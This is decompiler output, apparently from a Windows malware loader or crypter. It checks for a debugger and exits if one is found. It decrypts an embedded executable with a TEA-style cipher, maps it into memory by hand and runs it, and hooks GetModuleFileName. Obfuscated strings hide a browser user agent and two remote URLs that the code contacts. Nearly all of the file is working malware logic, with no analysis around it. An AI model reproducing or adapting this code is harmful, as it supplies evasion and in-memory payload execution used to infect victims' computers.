/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_3E1000(int);
BOOL __cdecl sub_3E101E(int, LPVOID lpAddress, SIZE_T dwSize);
int __stdcall sub_3E1050(int, int, int);
int __stdcall sub_3E1082(int, int, int);
int (__stdcall *__cdecl sub_3E10B2(HMODULE, unsigned __int8 *, CHAR *))(int a1, int a2, int a3);
BOOL __cdecl sub_3E1125(int);
_DWORD *__cdecl sub_3E1139(int, int);
char __cdecl sub_3E1270(void *, void *, int);
char __cdecl sub_3E12A7(void *, const void *, int);
unsigned int __cdecl sub_3E12DF(void **, int, unsigned int);
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
BOOL __cdecl sub_3E1424(HANDLE *);
int sub_3E1440();
int __cdecl sub_3E15B4(HINTERNET hFile, int, int); // idb
int __cdecl sub_3E15FA(_BYTE *);
void sub_3E1678();
void __noreturn start(); // weak
struct _TEB *sub_3E1B30();
int __cdecl sub_3E1B40(int, int, int);
int __cdecl sub_3E1C09(int);
int __cdecl sub_3E1CD1(int, int);
int __cdecl sub_3E1D70(int);
int sub_3E1DDA();
void sub_3E1DE1();
_BYTE *__cdecl sub_3E1EA7(_BYTE *, _BYTE *, int);
int __cdecl sub_3E1F12(unsigned __int8 *, _BYTE *);
int __cdecl sub_3E1F8E(unsigned __int8 *, unsigned __int8 *);
char *__cdecl sub_3E1FF0(unsigned int, char *, unsigned int);
char *__cdecl sub_3E200C(unsigned int, char *, unsigned int, int);
char *__cdecl sub_3E20C9(signed int, char *, unsigned int);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *InternetCloseHandle)(HINTERNET hInternet);
// extern HINTERNET (__stdcall *InternetOpenUrlA)(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
// extern HINTERNET (__stdcall *InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
// extern BOOL (__stdcall *InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
_UNKNOWN unk_3E4000; // weak
int dword_3E9A03 = 23040; // weak
int (__stdcall *dword_3E9A10)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_3E9A14)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_3E9A18 = 0; // weak
int dword_3E9A1C = 0; // weak
int dword_411056; // weak
int dword_41105A; // weak
int dword_41105E; // weak
int dword_411062; // weak


//----- (003E1000) --------------------------------------------------------
int __cdecl sub_3E1000(int a1)
{
  return *(_DWORD *)(a1 + 60) + a1;
}

//----- (003E101E) --------------------------------------------------------
BOOL __cdecl sub_3E101E(int a1, LPVOID lpAddress, SIZE_T dwSize)
{
  DWORD v3; // ecx
  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF

  flOldProtect = v3;
  sub_3E1EA7(lpAddress, (_BYTE *)a1, dwSize);
  return VirtualProtect(lpAddress, dwSize, 2u, &flOldProtect);
}
// 3E1021: variable 'v3' is possibly undefined

//----- (003E1050) --------------------------------------------------------
int __stdcall sub_3E1050(int a1, int a2, int a3)
{
  if ( !a1 || a1 == dword_3E9A1C )
    a1 = dword_3E9A18;
  return dword_3E9A10(a1, a2, a3);
}
// 3E9A10: using guessed type int (__stdcall *dword_3E9A10)(_DWORD, _DWORD, _DWORD);
// 3E9A18: using guessed type int dword_3E9A18;
// 3E9A1C: using guessed type int dword_3E9A1C;

//----- (003E1082) --------------------------------------------------------
int __stdcall sub_3E1082(int a1, int a2, int a3)
{
  if ( !a1 || a1 == dword_3E9A1C )
    a1 = dword_3E9A18;
  return dword_3E9A14(a1, a2, a3);
}
// 3E9A14: using guessed type int (__stdcall *dword_3E9A14)(_DWORD, _DWORD, _DWORD);
// 3E9A18: using guessed type int dword_3E9A18;
// 3E9A1C: using guessed type int dword_3E9A1C;

//----- (003E10B2) --------------------------------------------------------
int (__stdcall *__cdecl sub_3E10B2(HMODULE a1, unsigned __int8 *a2, CHAR *a3))(int a1, int a2, int a3)
{
  FARPROC ProcAddress; // [esp-4h] [ebp-8h]

  ProcAddress = GetProcAddress(a1, a3);
  if ( sub_3E1F8E(a2, "kernel32.dll") )
    return (int (__stdcall *)(int, int, int))ProcAddress;
  if ( !sub_3E1F12((unsigned __int8 *)a3, "GetModuleFileNameA") )
  {
    dword_3E9A10 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))ProcAddress;
    return sub_3E1050;
  }
  if ( sub_3E1F12((unsigned __int8 *)a3, "GetModuleFileNameW") )
    return (int (__stdcall *)(int, int, int))ProcAddress;
  dword_3E9A14 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))ProcAddress;
  return sub_3E1082;
}
// 3E9A10: using guessed type int (__stdcall *dword_3E9A10)(_DWORD, _DWORD, _DWORD);
// 3E9A14: using guessed type int (__stdcall *dword_3E9A14)(_DWORD, _DWORD, _DWORD);

//----- (003E1125) --------------------------------------------------------
BOOL __cdecl sub_3E1125(int a1)
{
  return a1 < 0;
}

//----- (003E1139) --------------------------------------------------------
_DWORD *__cdecl sub_3E1139(int a1, int a2)
{
  _DWORD *result; // eax
  int v3; // ecx
  CHAR *v4; // [esp-1Ch] [ebp-20h]
  HMODULE LibraryA; // [esp-18h] [ebp-1Ch]
  _DWORD *v6; // [esp-14h] [ebp-18h]
  void *ProcAddress; // [esp-10h] [ebp-14h]
  int *v8; // [esp-Ch] [ebp-10h]
  _DWORD *i; // [esp-4h] [ebp-8h]

  dword_3E9A18 = (int)GetModuleHandleA(0);
  dword_3E9A1C = a2;
  for ( i = (_DWORD *)(*(_DWORD *)(a1 + 128) + a2); ; i += 5 )
  {
    result = i;
    if ( !i[3] )
      break;
    v4 = (CHAR *)(i[3] + a2);
    LibraryA = LoadLibraryA(v4);
    if ( i[1] )
      v3 = *i + a2;
    else
      v3 = i[4] + a2;
    v8 = (int *)v3;
    v6 = (_DWORD *)(i[4] + a2);
    while ( *v8 )
    {
      if ( sub_3E1125(*v8) )
        ProcAddress = GetProcAddress(LibraryA, (LPCSTR)(unsigned __int16)*v8);
      else
        ProcAddress = sub_3E10B2(LibraryA, (unsigned __int8 *)v4, (CHAR *)(*v8 + a2 + 2));
      *v6++ = ProcAddress;
      ++v8;
    }
  }
  return result;
}
// 3E9A18: using guessed type int dword_3E9A18;
// 3E9A1C: using guessed type int dword_3E9A1C;

//----- (003E1270) --------------------------------------------------------
char __cdecl sub_3E1270(void *a1, void *a2, int a3)
{
  DWORD v4; // [esp-4h] [ebp-8h] BYREF

  v4 = 0;
  do
  {
    if ( !ReadFile(a1, a2, a3 - v4, &v4, 0) )
      return 0;
  }
  while ( v4 != a3 );
  return 1;
}

//----- (003E12A7) --------------------------------------------------------
char __cdecl sub_3E12A7(void *a1, const void *a2, int a3)
{
  DWORD v4; // [esp-4h] [ebp-8h] BYREF

  v4 = 0;
  do
  {
    if ( !WriteFile(a1, a2, a3 - v4, &v4, 0) )
      return 0;
  }
  while ( v4 != a3 );
  return 1;
}

//----- (003E12DF) --------------------------------------------------------
unsigned int __cdecl sub_3E12DF(void **a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp+0h] [ebp-4h]

  for ( i = 0; ; i += 2 )
  {
    result = i;
    if ( i >= a3 )
      break;
    sub_3E12A7(a1[1], (const void *)(a2 + 4 * i), 8);
    sub_3E1270(*a1, (void *)(a2 + 4 * i), 8);
  }
  return result;
}

//----- (003E1333) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  int i; // [esp+4h] [ebp-1Ch]
  unsigned int v4; // [esp+8h] [ebp-18h]
  int v5; // [esp+Ch] [ebp-14h]
  unsigned int v6; // [esp+10h] [ebp-10h]
  unsigned int v7; // [esp+18h] [ebp-8h] BYREF
  unsigned int v8; // [esp+1Ch] [ebp-4h]

  while ( sub_3E1270(*(void **)lpThreadParameter, &v7, 8) )
  {
    v5 = 32;
    v6 = v7;
    v4 = v8;
    for ( i = -957401312; v5--; i += 1640531527 )
    {
      v4 -= (dword_411062 + (v6 >> 5)) ^ (i + v6) ^ (dword_41105E + 16 * v6);
      v6 -= (dword_41105A + (v4 >> 5)) ^ (i + v4) ^ (dword_411056 + 16 * v4);
    }
    v7 = v6;
    v8 = v4;
    sub_3E12A7(*((void **)lpThreadParameter + 1), &v7, 8);
  }
  return 0;
}
// 411056: using guessed type int dword_411056;
// 41105A: using guessed type int dword_41105A;
// 41105E: using guessed type int dword_41105E;
// 411062: using guessed type int dword_411062;

//----- (003E1424) --------------------------------------------------------
BOOL __cdecl sub_3E1424(HANDLE *a1)
{
  CloseHandle(*a1);
  return CloseHandle(a1[1]);
}

//----- (003E1440) --------------------------------------------------------
int sub_3E1440()
{
  int v1; // eax
  char *lpAddress; // [esp+4h] [ebp-2Ch]
  int v3; // [esp+8h] [ebp-28h]
  HANDLE hObject; // [esp+Ch] [ebp-24h]
  HANDLE hReadPipe; // [esp+10h] [ebp-20h] BYREF
  HANDLE v6; // [esp+14h] [ebp-1Ch] BYREF
  struct _PEB *ProcessEnvironmentBlock; // [esp+18h] [ebp-18h]
  HANDLE v8; // [esp+1Ch] [ebp-14h] BYREF
  HANDLE hWritePipe; // [esp+20h] [ebp-10h] BYREF
  _DWORD *v10; // [esp+24h] [ebp-Ch]
  DWORD ThreadId; // [esp+28h] [ebp-8h] BYREF
  struct _TEB *v12; // [esp+2Ch] [ebp-4h]

  v12 = sub_3E1B30();
  ProcessEnvironmentBlock = v12->ProcessEnvironmentBlock;
  if ( ProcessEnvironmentBlock->BeingDebugged )
    return 0;
  dword_411056 = 30301;
  dword_41105A = 5484;
  dword_41105E = 29306;
  dword_411062 = 8655;
  if ( !CreatePipe(&hReadPipe, &hWritePipe, 0, 0x10u) )
    return 0;
  if ( !CreatePipe(&v8, &v6, 0, 0x10u) )
    return 0;
  hObject = CreateThread(0, 0, StartAddress, &hReadPipe, 0, &ThreadId);
  sub_3E12DF(&v8, (int)&unk_3E4000, (unsigned int)dword_3E9A03 >> 2);
  sub_3E1424(&v8);
  sub_3E1424(&hReadPipe);
  CloseHandle(hObject);
  v10 = (_DWORD *)sub_3E1000((int)&unk_3E4000);
  if ( v10 )
  {
    lpAddress = (char *)v10[13];
    sub_3E101E((int)&unk_3E4000, lpAddress, v10[21]);
    sub_3E1B40((int)v10, (int)&unk_3E4000, (int)lpAddress);
    v1 = sub_3E1000((int)lpAddress);
    v3 = v1;
    if ( v1 )
    {
      sub_3E1139(v1, (int)lpAddress);
      sub_3E1CD1(v3, (int)lpAddress);
      ProcessEnvironmentBlock->ImageBaseAddress = lpAddress;
      ((void (__cdecl *)(char *))&lpAddress[v10[10]])(&lpAddress[v10[10]]);
    }
  }
  return 0;
}
// 3E9A03: using guessed type int dword_3E9A03;
// 411056: using guessed type int dword_411056;
// 41105A: using guessed type int dword_41105A;
// 41105E: using guessed type int dword_41105E;
// 411062: using guessed type int dword_411062;

//----- (003E15B4) --------------------------------------------------------
int __cdecl sub_3E15B4(HINTERNET hFile, int a2, int a3)
{
  int v4; // [esp+0h] [ebp-8h]
  DWORD dwNumberOfBytesRead; // [esp+4h] [ebp-4h] BYREF

  v4 = 0;
  for ( dwNumberOfBytesRead = 0;
        InternetReadFile(hFile, (LPVOID)(v4 + a2), a3 - v4, &dwNumberOfBytesRead) && dwNumberOfBytesRead;
        v4 += dwNumberOfBytesRead )
  {
    ;
  }
  return v4;
}

//----- (003E15FA) --------------------------------------------------------
int __cdecl sub_3E15FA(_BYTE *a1)
{
  int result; // eax

  while ( 1 )
  {
    result = (unsigned __int8)*a1;
    if ( !*a1 )
      break;
    *a1 = -1 - *a1;
    ++a1;
  }
  return result;
}

//----- (003E1678) --------------------------------------------------------
void sub_3E1678()
{
  void *v0; // eax
  void *v1; // [esp-A0h] [ebp-A4h]
  int i; // [esp-9Ch] [ebp-A0h]
  CHAR v3[28]; // [esp-98h] [ebp-9Ch] BYREF
  CHAR v4[36]; // [esp-7Ch] [ebp-80h] BYREF
  DWORD v5; // [esp-58h] [ebp-5Ch]
  HINTERNET v6; // [esp-54h] [ebp-58h]
  CHAR v7[76]; // [esp-50h] [ebp-54h] BYREF
  int v8; // [esp-4h] [ebp-8h]

  v7[0] = -78;
  v7[1] = -112;
  v7[2] = -123;
  v7[3] = -106;
  v7[4] = -109;
  v7[5] = -109;
  v7[6] = -98;
  v7[7] = -48;
  v7[8] = -53;
  v7[9] = -47;
  v7[10] = -49;
  v7[11] = -33;
  v7[12] = -41;
  v7[13] = -100;
  v7[14] = -112;
  v7[15] = -110;
  v7[16] = -113;
  v7[17] = -98;
  v7[18] = -117;
  v7[19] = -106;
  v7[20] = -99;
  v7[21] = -109;
  v7[22] = -102;
  v7[23] = -60;
  v7[24] = -33;
  v7[25] = -78;
  v7[26] = -84;
  v7[27] = -74;
  v7[28] = -70;
  v7[29] = -33;
  v7[30] = -55;
  v7[31] = -47;
  v7[32] = -49;
  v7[33] = -99;
  v7[34] = -60;
  v7[35] = -33;
  v7[36] = -88;
  v7[37] = -106;
  v7[38] = -111;
  v7[39] = -101;
  v7[40] = -112;
  v7[41] = -120;
  v7[42] = -116;
  v7[43] = -33;
  v7[44] = -79;
  v7[45] = -85;
  v7[46] = -33;
  v7[47] = -54;
  v7[48] = -47;
  v7[49] = -49;
  v7[50] = -60;
  v7[51] = -33;
  v7[52] = -47;
  v7[53] = -79;
  v7[54] = -70;
  v7[55] = -85;
  v7[56] = -33;
  v7[57] = -68;
  v7[58] = -77;
  v7[59] = -83;
  v7[60] = -33;
  v7[61] = -50;
  v7[62] = -47;
  v7[63] = -49;
  v7[64] = -47;
  v7[65] = -51;
  v7[66] = -58;
  v7[67] = -50;
  v7[68] = -53;
  v7[69] = -42;
  v7[70] = 0;
  v4[0] = -105;
  v4[1] = -117;
  v4[2] = -117;
  v4[3] = -113;
  v4[4] = -59;
  v4[5] = -48;
  v4[6] = -48;
  v4[7] = -98;
  v4[8] = -116;
  v4[9] = -117;
  v4[10] = -98;
  v4[11] = -111;
  v4[12] = -98;
  v4[13] = -50;
  v4[14] = -58;
  v4[15] = -57;
  v4[16] = -57;
  v4[17] = -47;
  v4[18] = -103;
  v4[19] = -115;
  v4[20] = -102;
  v4[21] = -102;
  v4[22] = -105;
  v4[23] = -112;
  v4[24] = -116;
  v4[25] = -117;
  v4[26] = -106;
  v4[27] = -98;
  v4[28] = -47;
  v4[29] = -100;
  v4[30] = -112;
  v4[31] = -110;
  v4[32] = 0;
  v3[0] = -105;
  v3[1] = -117;
  v3[2] = -117;
  v3[3] = -113;
  v3[4] = -59;
  v3[5] = -48;
  v3[6] = -48;
  v3[7] = -98;
  v3[8] = -116;
  v3[9] = -117;
  v3[10] = -98;
  v3[11] = -111;
  v3[12] = -98;
  v3[13] = -47;
  v3[14] = -102;
  v3[15] = -121;
  v3[16] = -112;
  v3[17] = -103;
  v3[18] = -106;
  v3[19] = -115;
  v3[20] = -102;
  v3[21] = -47;
  v3[22] = -111;
  v3[23] = -102;
  v3[24] = -117;
  v3[25] = 0;
  v5 = 67645440;
  v8 = sub_3E1DDA();
  sub_3E15FA(v7);
  sub_3E15FA(v4);
  sub_3E15FA(v3);
  v6 = InternetOpenA(v7, 1u, 0, 0, 0);
  if ( v6 )
  {
    for ( i = 0; i < 2; ++i )
    {
      if ( i )
        v0 = InternetOpenUrlA(v6, v3, 0, 0, v5, 0);
      else
        v0 = InternetOpenUrlA(v6, v4, 0, 0, v5, 0);
      v1 = v0;
      if ( v0 )
      {
        sub_3E15B4(v0, v8, 4096);
        InternetCloseHandle(v1);
      }
    }
    InternetCloseHandle(v6);
  }
  sub_3E1DE1();
}

//----- (003E1B12) --------------------------------------------------------
void __noreturn start()
{
  int v0; // [esp-4h] [ebp-8h]

  sub_3E1678();
  v0 = sub_3E1440();
  ExitProcess(v0);
}
// 3E1B12: using guessed type void __noreturn start();

//----- (003E1B30) --------------------------------------------------------
struct _TEB *sub_3E1B30()
{
  return NtCurrentTeb();
}

//----- (003E1B40) --------------------------------------------------------
int __cdecl sub_3E1B40(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-28h]
  unsigned __int16 i; // [esp+18h] [ebp-10h]
  unsigned __int16 v6; // [esp+20h] [ebp-8h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = *(_WORD *)(a1 + 6);
  v7 = a1 + 248;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= (int)v6 )
      break;
    if ( *(_DWORD *)(40 * i + v7 + 8) >= *(_DWORD *)(40 * i + v7 + 16) )
      v4 = *(_DWORD *)(40 * i + v7 + 16);
    else
      v4 = *(_DWORD *)(40 * i + v7 + 8);
    sub_3E1EA7((_BYTE *)(*(_DWORD *)(40 * i + v7 + 12) + a3), (_BYTE *)(*(_DWORD *)(40 * i + v7 + 20) + a2), v4);
  }
  return result;
}

//----- (003E1C09) --------------------------------------------------------
int __cdecl sub_3E1C09(int a1)
{
  int v2; // [esp+0h] [ebp-4h]

  v2 = 0;
  if ( (a1 & 0x4000000) != 0 )
    v2 = 512;
  if ( (a1 & 0x20000000) != 0 )
  {
    if ( (a1 & 0x40000000) != 0 )
    {
      if ( a1 >= 0 )
        return v2 | 0x20;
      else
        return v2 | 0x40;
    }
    else if ( a1 >= 0 )
    {
      return v2 | 0x10;
    }
    else
    {
      return v2 | 0x80;
    }
  }
  else if ( (a1 & 0x40000000) != 0 )
  {
    if ( a1 >= 0 )
      return v2 | 2;
    else
      return v2 | 4;
  }
  else if ( a1 >= 0 )
  {
    return v2 | 1;
  }
  else
  {
    return v2 | 8;
  }
}

//----- (003E1CD1) --------------------------------------------------------
int __cdecl sub_3E1CD1(int a1, int a2)
{
  int result; // eax
  int v3; // eax
  SIZE_T dwSize; // [esp+0h] [ebp-1Ch]
  void *lpAddress; // [esp+4h] [ebp-18h]
  DWORD flOldProtect; // [esp+8h] [ebp-14h] BYREF
  unsigned __int16 i; // [esp+Ch] [ebp-10h]
  int v8; // [esp+10h] [ebp-Ch]
  unsigned __int16 v9; // [esp+14h] [ebp-8h]
  int v10; // [esp+18h] [ebp-4h]

  v8 = a1 + 248;
  v9 = *(_WORD *)(a1 + 6);
  v10 = a1 + 248;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= (int)v9 )
      break;
    lpAddress = (void *)(*(_DWORD *)(40 * i + v10 + 12) + a2);
    dwSize = *(_DWORD *)(40 * i + v10 + 8);
    v3 = sub_3E1C09(*(_DWORD *)(40 * i + v10 + 36));
    VirtualProtect(lpAddress, dwSize, v3, &flOldProtect);
  }
  return result;
}

//----- (003E1D70) --------------------------------------------------------
int __cdecl sub_3E1D70(int a1)
{
  if ( a1 < 65 || a1 > 90 )
    return a1;
  else
    return a1 + 32;
}

//----- (003E1DDA) --------------------------------------------------------
int sub_3E1DDA()
{
  return 0;
}

//----- (003E1DE1) --------------------------------------------------------
void sub_3E1DE1()
{
  ;
}

//----- (003E1EA7) --------------------------------------------------------
_BYTE *__cdecl sub_3E1EA7(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *v5; // [esp-4h] [ebp-8h]

  v5 = a1;
  while ( a3-- )
    *a1++ = *a2++;
  return v5;
}

//----- (003E1F12) --------------------------------------------------------
int __cdecl sub_3E1F12(unsigned __int8 *a1, _BYTE *a2)
{
  int v3; // [esp-4h] [ebp-8h]

  while ( 1 )
  {
    v3 = *a1 - (unsigned __int8)*a2;
    if ( v3 || !*a2 )
      break;
    ++a1;
    ++a2;
  }
  if ( v3 < 0 )
    return -1;
  if ( v3 > 0 )
    return 1;
  return v3;
}

//----- (003E1F8E) --------------------------------------------------------
int __cdecl sub_3E1F8E(unsigned __int8 *a1, unsigned __int8 *a2)
{
  int v2; // eax
  int v4; // [esp-4h] [ebp-8h]

  do
  {
    v4 = sub_3E1D70(*a1++);
    v2 = sub_3E1D70(*a2++);
  }
  while ( v4 && v4 == v2 );
  return v4 - v2;
}

//----- (003E1FF0) --------------------------------------------------------
char *__cdecl sub_3E1FF0(unsigned int a1, char *a2, unsigned int a3)
{
  sub_3E200C(a1, a2, a3, 0);
  return a2;
}

//----- (003E200C) --------------------------------------------------------
char *__cdecl sub_3E200C(unsigned int a1, char *a2, unsigned int a3, int a4)
{
  char *result; // eax
  char *v5; // [esp-10h] [ebp-14h]
  char v6; // [esp-9h] [ebp-Dh]
  unsigned int v7; // [esp-8h] [ebp-Ch]
  char *v8; // [esp-4h] [ebp-8h]
  char *v9; // [esp-4h] [ebp-8h]

  v8 = a2;
  if ( a4 )
  {
    *a2 = 45;
    v8 = a2 + 1;
    a1 = -a1;
  }
  v5 = v8;
  do
  {
    v7 = a1 % a3;
    a1 /= a3;
    if ( v7 <= 9 )
      *v8 = v7 + 48;
    else
      *v8 = v7 + 87;
    ++v8;
  }
  while ( a1 );
  *v8 = 0;
  v9 = v8 - 1;
  do
  {
    v6 = *v9;
    *v9 = *v5;
    *v5 = v6;
    --v9;
    result = ++v5;
  }
  while ( v5 < v9 );
  return result;
}

//----- (003E20C9) --------------------------------------------------------
char *__cdecl sub_3E20C9(signed int a1, char *a2, unsigned int a3)
{
  if ( a3 == 10 && a1 < 0 )
    sub_3E200C(a1, a2, 0xAu, 1);
  else
    sub_3E200C(a1, a2, a3, 0);
  return a2;
}

// nfuncs=30 queued=30 decompiled=30 lumina nreq=0 worse=0 better=0
// ALL OK, 30 function(s) have been successfully decompiled
